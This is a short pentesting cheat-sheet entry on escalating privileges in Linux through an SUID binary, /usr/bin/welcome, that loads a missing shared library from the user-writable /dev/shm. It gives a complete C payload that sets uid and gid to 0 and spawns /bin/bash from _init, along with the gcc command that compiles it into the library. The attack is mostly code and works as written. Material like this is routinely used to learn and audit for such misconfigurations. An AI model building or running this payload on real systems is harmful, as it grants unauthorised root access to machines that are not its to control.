# Shared Library Misconfigurations

# Exploitation
We are going to suppose that there's an **SUID binary** called **/usr/bin/welcome**.           
However, the user is unable to run it as the binary cannot find a library file *(let's call it **libhello.so**)* which
should be in `/dev/shm`.                
Since, this directory is in control of the current user, we'll move there and create a `.c` file.
```c
// libhello.c
#include <stdlib.h>
#include <unistd.h>

void _init() {
    setuid(0);
    setgid(0);
    system("/bin/bash");
}
```
This code will spawn an interactive shell upon running it.              
Now we need to compile it as a library file and save it to `/dev/shm`
```bash
gcc -shared libhello.c -o libhello.so -fPIC -nostartfiles
```
Upon running `/usr/bin/welcome`, it will spawn an elevated shell.


# References
- [https://tbhaxor.com/exploiting-shared-library-misconfigurations/](https://tbhaxor.com/exploiting-shared-library-misconfigurations/)